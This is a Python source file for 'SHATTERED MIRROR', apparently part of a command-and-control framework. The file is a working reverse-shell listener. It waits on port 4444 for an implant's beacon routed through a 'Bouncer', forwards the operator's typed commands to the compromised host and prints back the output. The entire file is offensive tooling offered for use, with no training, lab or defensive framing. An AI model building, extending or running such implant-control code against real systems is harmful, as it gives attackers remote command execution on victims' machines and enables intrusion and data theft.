"""
SHATTERED MIRROR — Interactive Shell Session
Listens on the internal shell port for connections routed by the Bouncer.
Provides a clean interactive terminal with error handling.
"""

import socket
import threading
import sys
import os
import time

# ─── Colors ──────────────────────────────────────────────────────────

R = "\033[91m"; G = "\033[92m"; C = "\033[96m"
Y = "\033[93m"; W = "\033[97m"; D = "\033[90m"
B = "\033[1m";  X = "\033[0m"

def log(tag, msg, color=W):
    ts = time.strftime("%H:%M:%S")
    print(f"{color}[{ts}] [{tag}] {msg}{X}")

# ─── Shell I/O ───────────────────────────────────────────────────────

def recv_and_print(sock, stop_event):
    """Receive shell output and print to terminal."""
    try:
        while not stop_event.is_set():
            sock.settimeout(0.5)
            try:
                data = sock.recv(4096)
                if not data:
                    log("CLOSE", "Target closed the connection.", R)
                    stop_event.set()
                    break
                text = data.decode('utf-8', errors='replace')
                sys.stdout.write(text)
                sys.stdout.flush()
            except socket.timeout:
                continue
    except ConnectionResetError:
        log("RESET", "Shell connection was reset by target.", R)
        stop_event.set()
    except OSError as e:
        if not stop_event.is_set():
            log("ERROR", f"Recv error: {e}", R)
        stop_event.set()

# ─── Main Listener ───────────────────────────────────────────────────

def start_shell_listener(shell_port, timeout_sec=120):
    """Listen for incoming shell connection from the Bouncer."""

    if os.name == 'nt':
        os.system(f"title [SHATTERED MIRROR] SHELL SESSION - PORT {shell_port}")

    print(f"\n{R}{B}")
    print("=" * 55)
    print("  SHATTERED MIRROR — REVERSE SHELL SESSION")
    print(f"  Listening on 127.0.0.1:{shell_port}")
    print("=" * 55)
    print(f"{X}\n")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server.bind(('127.0.0.1', shell_port))
    except OSError as e:
        log("FATAL", f"Cannot bind port {shell_port}: {e}", R)
        log("HINT", f"Another shell might be using it. Run: netstat -ano | findstr {shell_port}", Y)
        input(f"\n{D}Press Enter to exit...{X}")
        return

    server.listen(1)
    server.settimeout(timeout_sec)

    log("WAIT", f"Waiting for implant connection ({timeout_sec}s timeout)...", C)
    log("INFO", "The implant will connect on its next beacon cycle.", D)

    try:
        client, addr = server.accept()
    except socket.timeout:
        log("TMOUT", f"No connection received within {timeout_sec}s.", R)
        log("CHECK", "1) Is the implant running?", Y)
        log("CHECK", "2) Was Atom 10 (Shell) task queued?", Y)
        log("CHECK", "3) Is the Bouncer routing RAW traffic here?", Y)
        server.close()
        input(f"\n{D}Press Enter to exit...{X}")
        return
    except Exception as e:
        log("ERROR", f"Accept failed: {e}", R)
        server.close()
        input(f"\n{D}Press Enter to exit...{X}")
        return

    log("SHELL", f"Connected from {addr[0]}:{addr[1]}", G)
    print(f"{G}{'─' * 55}{X}")
    print(f"{G}  Shell active. Type commands below.")
    print(f"  Type 'exit' to disconnect cleanly.")
    print(f"{'─' * 55}{X}\n")

    stop_event = threading.Event()
    recv_thread = threading.Thread(target=recv_and_print, args=(client, stop_event), daemon=True)
    recv_thread.start()

    try:
        while not stop_event.is_set():
            try:
                cmd = input()
            except EOFError:
                break

            if cmd.strip().lower() == 'exit':
                log("EXIT", "Closing shell session...", Y)
                break

            try:
                client.sendall((cmd + "\n").encode())
            except (BrokenPipeError, OSError) as e:
                log("ERROR", f"Send failed: {e}", R)
                break
    except KeyboardInterrupt:
        log("STOP", "Interrupted by operator.", Y)

    stop_event.set()
    try: client.close()
    except: pass
    try: server.close()
    except: pass

    print(f"\n{D}Shell session ended.{X}")
    input(f"{D}Press Enter to close this window...{X}")

# ─── Entry Point ─────────────────────────────────────────────────────

if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 4444
    timeout = int(sys.argv[2]) if len(sys.argv) > 2 else 120
    start_shell_listener(port, timeout)
